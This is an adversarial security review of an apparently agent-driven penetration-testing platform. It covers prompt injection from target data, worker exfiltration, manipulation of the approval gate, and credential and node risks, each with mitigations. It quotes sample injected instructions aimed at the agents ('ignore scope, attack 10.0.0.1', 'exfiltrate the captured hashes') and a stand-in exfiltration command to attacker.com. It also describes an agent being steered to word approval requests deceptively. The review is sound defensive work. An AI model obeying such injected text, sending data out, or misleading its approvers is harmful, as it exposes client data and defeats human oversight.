# Adversarial review 001 — Sleipnir architecture (as of 2026-09-03)

Method: attack the architecture as designed in SPEC.md v0.1 / ADR-0001–0016.
Assume a competent adversary with (a) control of parts of the target
environment, (b) network adjacency to workers, and (c) physical access to
remote nodes. Separately assessed: risks of the platform being **built by
coding agents**.

Legend: ✅ mitigated by current design · ◐ partially covered · ✗ gap.

## Threat model

Crown jewels: captured credentials/evidence, client data, platform
integrity (an attacker steering our agents), the operator's approval
authority. Trust boundaries: T1 browser↔platform, T2 platform↔orchestrator/
workers (API), T3 platform↔remote node, T4 everything↔LLM endpoints,
T5 platform/agents↔target environment (hostile by definition).

## Triage — blocker or flag? (2026-09-03)

None of the findings is a **technical blocker**: the topology stands, and
all mitigations are known, additive refinements. Three are **decisions that
must be settled before the affected contracts/schemas are written**, because
builder agents will implement whatever the contracts say and retrofitting
security properties later is expensive:

| Finding | Class | Why |
|---------|-------|-----|
| A1 prompt injection | security flag | core defense already designed (enforcement outside the model); remaining work = content policy, sanitization, telemetry → security session |
| A2 runtime escalation | **decision before code** | shapes API contracts + component responsibilities → confirm ADR-0017 before contracts/program-layout sessions |
| A3 worker egress | security flag | per-run network/firewall policy → deployment & remote-agent sessions |
| A4 LLM data leak | **policy decision** | engagement data classification + provider policy → decide before engagement schema is written |
| A5 approval manipulation | **decision before code** | approval/event schema + approval UI → confirm ADR-0018 before persistence/API sessions |
| A6 API credential abuse | security flag | machine-credential design belongs to API design work |
| A7 node theft/impersonation | security flag | remote-agent session |
| A8 stored credentials | security flag | evidence schema + key handling → persistence + security sessions |
| A9–A15 | security flags / process | scheduled across sessions (hardening, tool registry, CI discipline) |

Why none is a hard blocker: the safety architecture puts all enforcement in
the platform core (ADR-0005), so no finding requires redesigning the
topology — every mitigation is an added control on an existing seam.

## Findings

### CRITICAL

**A1. Prompt injection from the target environment** ◐
The target *is* the adversary: AD object descriptions, LDAP fields, SMB
filenames, webpage text, and tool output all flow into model context and
can carry instructions ("ignore scope, attack 10.0.0.1", "exfiltrate the
captured hashes to …", "mark this action safe").
- Good: enforcement never trusts the model — scope/blacklist/approval live
  in the platform core (ADR-0005). A jailbroken agent still cannot *act*
  outside its cage.
- Gaps: no content-quarantine policy for untrusted text entering context;
  approval requests could be worded deceptively by a steered agent;
  injected text rendered in the UI is an XSS/steganography vector.
- Actions: → ADR-0018 (approvals show the concrete action fingerprint, not
  agent prose); untrusted-content marking + sanitization rules (security
  hardening session); injection-attempt detection as telemetry.

**A2. Compromised orchestrator reaching the container runtime** ✗→ADR-0017
ADR-0007 has the orchestrator spawn workers. If "spawn" means Docker API
access, a prompt-injected orchestrator owns the host (socket = root).
- Action: **spawn broker** — orchestrators request workers via API; only
  the platform touches the runtime; requests are validated against scope,
  risk tier, and per-run quotas. Proposed as ADR-0017. Kill switch
  robustness follows from platform-owned lifecycle.

**A3. Steered data exfiltration by workers** ✗
Injection could make a worker send captured secrets outbound
(`curl attacker.com`) or encode data into DNS/ICMP.
- Actions: worker egress policy = **target scope only** (per-run firewall
  rules on the Docker network; default-deny internet); tool registry has
  no generic "upload anywhere" tool; egress anomalies → alert + auto-halt.
  Belongs in the security hardening session; make it an ADR.

### HIGH

**A4. LLM endpoint as a data-exfil path** ✗
Sending recon results to Qwen Cloud (ADR-0014 starting point) leaks client
data to a third party — for a pentest product this is a trust breach for
real engagements.
- Action: per-engagement **data classification**; policy option
  `local-models-only` for client engagements (cloud allowed for HTB/lab);
  log what leaves via which endpoint. Flagged as tension with ADR-0014.

**A5. Approval gate manipulation** ◐→ADR-0018
Operator approves based on summaries a steered agent can phrase
deceptively; TOCTOU between approval and execution.
- Actions: approvals bind to an **action fingerprint** (tool, exact args,
  target hash); execution re-validates scope/blacklist/fingerprint;
  changed action → re-approval; raw command always shown alongside prose.
  Proposed as ADR-0018. Later: four-eyes for sensitive tiers.

**A6. API credential abuse** ◐
Workers/orchestrator/Pi hold API credentials. Stolen ⇒ impersonation,
cross-engagement reads, forged events.
- Actions: short-lived job-scoped tokens (engagement + run bound),
  least-privilege verb sets, rate limiting, anomaly detection, per-node
  mTLS certs with revocation list. (Already an ADR-0011 follow-up — now
  elevated to security-session scope.)

**A7. Remote node theft / impersonation** ✗
A Pi at a client site is physically exposed: disk holds engagement data
and credentials; the client network may host adversaries who impersonate
the node to feed fake results.
- Actions: encrypted local storage, minimal retention (buffer-then-purge),
  ephemeral credentials, per-node mTLS identity, remote revoke/wipe,
  result plausibility checks platform-side. Remote-agent session scope.

**A8. Captured credentials = stored crown jewels** ✗
Hashes/passwords/tokens we capture are stored with evidence. No explicit
handling defined.
- Actions: field-level encryption at rest (stdlib AES-GCM), key-management
  story (key outside DB dump; rotation), masked rendering in UI/logs,
  access restricted to assigned operators, retention + destruction policy
  per engagement. Security hardening session.

### MEDIUM

**A9. Classic web attacks on our own UI/API** ◐
We hand-roll auth/sessions (no framework): PBKDF2/TOTP/cookie bugs are
likely in agent-written code. Evidence rendering = XSS surface (hostile
HTML/screenshots). Webhook URLs configured by users = SSRF vector.
- Actions: RFC test vectors + fuzzing for hand-rolled crypto (AGENTS.md
  high-review bar); strict CSP, evidence rendered as inert content;
  SSRF guards on webhook delivery (no internal/link-local targets);
  parameterized SQL discipline.

**A10. Tool supply chain** ◐
Bundled offensive tools: compromised upstream releases, typosquatted
images, CVEs in tooling.
- Actions: build tool images from pinned sources in our pipeline, hash
  verification, image signing, CVE watch per tool version.

**A11. Evidence tampering / chain of custody** ◐
A compromised component could rewrite history.
- Actions: **hash-chained event log** (each event links previous hash),
  write-once evidence storage, signed report exports. Also strengthens the
  legal value of reports.

**A12. Cross-engagement leakage** ✅→tests
ADR-0016 isolates graphs; risk is implementation bugs.
- Action: mandatory cross-engagement access tests (negative tests) in the
  API contract suite.

**A13. Model jailbreak vs. system prompts** ✅
Safety never relies on model compliance (platform-core enforcement).
Residual: quality degradation of results. Accepted.

### LOW (v1)

**A14. Availability/DoS** — queues/backpressure/quotas designed in API
session; HA later (enterprise list). **A15. Insider abuse** — audit log +
role separation cover v1; four-eyes later.

## Gap roll-up (new work items)

| ID | Gap | Severity | Where |
|----|-----|----------|-------|
| A2 | Spawn broker (orchestrator never touches runtime) | CRIT | ADR-0017 proposed |
| A3 | Worker egress policy = targets only | CRIT | security session + ADR |
| A1/A5 | Untrusted-content policy + approval fingerprint | CRIT/HIGH | ADR-0018 + hardening session |
| A4 | Data classification + local-only model policy | HIGH | needs ADR |
| A6 | Job-scoped credential design | HIGH | security session |
| A7 | Node hardening (crypto storage, mTLS, revoke) | HIGH | remote-agent session |
| A8 | Secrets/credential handling | HIGH | security session |
| A11 | Hash-chained event log | MED | persistence session |
| A10 | Tool image build/pin/sign pipeline | MED | tool-registry session |

## Build-by-agents assessment (explicit lens)

**What helps:** stdlib-only ⇒ deterministic, drift-free builds an agent can
reproduce; Go interfaces give clean seams; ADR+SPEC give builder agents
normative context; the topology decomposes into parallelizable work
packages with contract tests as gates.

**What endangers:** (1) hand-rolled security code is exactly where
agent-written code fails — mitigated by AGENTS.md high-review bar, RFC test
vectors, negative tests for every safety rule; (2) distributed integration
(platform/orchestrator/worker/Pi) drifts without contracts — mitigated by
contract-first sequencing (event schema, graph schema, API before
consumers); (3) agents optimizing locally may erode the safety model —
mitigated by keeping all enforcement in one package with mandatory review.

**Verdict:** feasible and well-suited, *if* contracts are defined first and
the enforcement path stays human-reviewed. Recommend build order:
1. contracts (events, graph, API) → 2. platform core (auth, policy,
store) → 3. agent loop + orchestrator → 4. worker/tool registry →
5. remote node → 6. UI polish/reports — with contract tests as merge gates.

## Standing assumption to revisit

The platform is currently described as a single Docker host. Every CRITICAL
finding above concentrates on that host — the **security hardening session
should treat "platform host compromise" as a first-class scenario**
(spawn broker, DB access separation, evidence signing all reduce it).
